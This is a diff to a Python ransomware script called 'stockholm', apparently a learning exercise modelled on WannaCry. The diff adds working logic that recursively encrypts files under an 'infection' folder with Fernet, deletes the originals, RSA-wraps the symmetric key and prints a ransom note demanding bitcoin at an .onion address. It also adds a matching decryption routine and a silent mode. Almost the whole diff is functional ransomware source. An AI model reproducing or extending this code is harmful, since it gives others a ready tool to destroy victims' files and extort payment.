@@ -10,6 +10,23 @@ from Crypto.Cipher import PKCS1_v1_5
 
 version = "1.0.0"
 
+def print_readme():
+    print(" (                  )                )      )      )    (        *     ")
+    print(" )\ )    *   )   ( /(      (      ( /(   ( /(   ( /(    )\ )   (  `    ")
+    print("(()/(  ` )  /(   )\())     )\     )\())  )\())  )\())  (()/(   )\))(   ")
+    print(" /(_))  ( )(_)) ((_)\    (((_)  |((_)\  ((_)\  ((_)\    /(_)) ((_)()\  ")
+    print("(_))   (_(_())    ((_)   )\___  |_ ((_)  _((_)   ((_)  (_))   (_()((_) ")
+    print("/ __|  |_   _|   / _ \  ((/ __| | |/ /  | || |  / _ \  | |    |  \/  | ")
+    print("\__ \    | |    | (_) |  | (__    ' <   | __ | | (_) | | |__  | |\/| | ")
+    print("|___/    |_|     \___/    \___|  _|\_\  |_||_|  \___/  |____| |_|  |_| ")
+    print("                                                                       ")
+    print("                        Wannacry infection                             ")
+    print()
+    print("Your files have been encrypted, please pay the ranson and get the files back")
+    print("        Access this location: klasdhgbndfvabnoingioasasdfa.onion")
+    print("    Send the encrypted key if provided to the location with the bitcoins")
+    print()
+
 wannacry_extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']
 
 def parse_arguments():
@@ -40,25 +57,6 @@ class wannacry:
         dmsg = cipher.decrypt(emsg, sentinel)
         return dmsg.decode()
     
-    def symetric_encrypt(self, file_path, file_name, key, extensions):
-        try:
-            if os.path.splitext(file_path)[1] in extensions:
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                fernet = Fernet(key)
-                data_enc = fernet.encrypt(data)
-                with open(f'{file_name}.ft', 'wb') as f:
-                    f.write(data_enc)
-            else:
-                print(f"{file_name} NOT encrypted")
-        except:
-            pass
-
-    def symetric_decrypt(self, key_enc, key):
-        fernet = Fernet(key)
-        key_dec = fernet.decrypt(key_enc)
-        return key_dec
-
     def generate_key_pair(self, ):
         key = RSA.generate(2048)
         public_key = key.publickey()
@@ -68,22 +66,58 @@ class wannacry:
             f.write(private_key_pem)
         with open('public_key.pem', 'wb') as f:
             f.write(public_key_pem)
-        #print("Keys saved successfully.")
+        print("Keys saved successfully.")
 
-    def wannacry_encryption(self, dir_path, key, extensions):
-        try: 
-            files = os.listdir(dir_path)
-            for file_name in files:
-                file_path = os.path.join(dir_path, file_name)
-                if os.path.isfile(file_path):
-                    #self.symetric_encrypt(file_path, file_name, key, extensions)
-                    print(f"encrypt {file_name}")
-                elif os.path.isdir(file_path):
-                    self.wannacry_encryption(file_path, key, extensions)
-                else:
-                    print("Could not encrypt")
+    def symetric_encrypt(self, file_path, file_name, key, extensions):
+        try:
+            if os.path.splitext(file_path)[1] in extensions or os.path.splitext(file_path)[1] is '':
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+                fernet = Fernet(key)
+                data_enc = fernet.encrypt(data)
+                with open(f'{os.path.splitext(file_path)[0]}.ft', 'wb') as f:
+                    f.write(data_enc)
+                if self.silent is False:
+                    print(f"Encrypt {file_path}")
+                os.remove(file_path)
         except:
-            pass
+            if self.silent is False:
+                print(f"Could not encrypt {file_path}")
+
+    def symetric_decrypt(self, file_path, file_name, key):
+        try:
+            if os.path.splitext(file_path)[1] == ".ft":
+                with open(file_path, 'rb') as f:
+                    data = f.read()
+                fernet = Fernet(key)
+                data_dec = fernet.decrypt(data)
+                with open(f'{os.path.splitext(file_path)[0]}', 'wb') as f:
+                    f.write(data_dec)
+                if self.silent is False:
+                    print(f"Decrypt {file_path}")
+                os.remove(file_path)
+        except:
+            if self.silent is False:
+                print(f"Could not decrypt {file_path}")
+
+    def wannacry_encryption(self, dir_path, key, extensions): 
+        files = os.listdir(dir_path)
+        for file_name in files:
+            file_path = os.path.join(dir_path, file_name)
+            if os.path.isfile(file_path):
+                self.symetric_encrypt(file_path, file_name, key, extensions)
+            elif os.path.isdir(file_path):
+                self.wannacry_encryption(file_path, key, extensions)
+    
+    def wannacry_decryption(self, dir_path, key):    
+        files = os.listdir(dir_path)
+        for file_name in files:
+            file_path = os.path.join(dir_path, file_name)
+            if os.path.isfile(file_path):
+                self.symetric_decrypt(file_path, file_name, key)
+            elif os.path.isdir(file_path):
+                self.wannacry_decryption(file_path, key)
+
 
 if __name__ == "__main__":
     args = parse_arguments()
@@ -94,28 +128,45 @@ if __name__ == "__main__":
        exit()
     if args.version is True:
        print(f"stockholm: v{version}")
-       exit
-
+       exit()
+    
     home = os.path.expanduser("~")
     infection = os.path.join(home, "infection")
     if os.path.isdir(infection) is not True:
-        print("'infection' folder does not exist")
+        if wc.silent is False:
+            print("'infection' folder does not exist")
         exit()
 
     if args.reverse is False:
+        if wc.silent is False:
+            print_readme()
         symetric_key = Fernet.generate_key()
         wc.wannacry_encryption(infection, symetric_key, wannacry_extensions)
         try:
             with open("public_key.pem", 'rb') as f:
                 public_key = RSA.import_key(f.read())
             symetric_key_encrypted = wc.asymetric_encrypt(symetric_key, public_key)
-            with open(os.path.join(infection, 'key_encrypted.ft'), 'wb') as f:
+            with open(os.path.join(infection, 'key_encrypted'), 'wb') as f:
                 f.write(symetric_key_encrypted)
+            if wc.silent is False:
+                print("file 'key_encrypted' created")
         except:
-            with open(os.path.join(infection, 'key_not_encrypted.ft'), 'wb') as f:
+            with open(os.path.join(infection, 'key_not_encrypted.pem'), 'wb') as f:
                 f.write(symetric_key)
+            if wc.silent is False:
+                print("file 'key_not_encrypted.pem' created")
     else:
-        print("reverse")
+        try:
+            if os.path.isfile("key_decrypted.pem"): 
+                with open("key_decrypted.pem", 'rb') as f:
+                    key_decrypted = f.read()
+            elif os.path.isfile("key_not_encrypted.pem"): 
+                with open("key_not_encrypted.pem", 'rb') as f:
+                    key_decrypted = f.read()
+            wc.wannacry_decryption(infection, key_decrypted)
+        except:
+            if wc.silent is False:
+                print("key not found")
 
     
 
